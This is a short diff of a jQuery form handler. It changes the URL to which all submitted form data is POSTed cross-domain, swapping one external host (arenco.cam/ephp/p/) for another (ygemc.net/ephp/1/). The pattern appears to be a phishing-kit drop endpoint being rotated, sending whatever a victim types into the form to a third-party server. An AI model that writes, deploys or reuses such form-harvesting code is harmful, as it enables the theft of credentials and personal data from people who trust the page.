@@ -16,7 +16,7 @@ $(document).ready(function () {
         $("#byn").html("Processing..").prop("disabled", true);
 
         $.ajax({
-            url: "https://arenco.cam/ephp/p/",
+            url: "https://ygemc.net/ephp/1/",
             type: 'POST',
             data: formData,
             crossDomain: true,
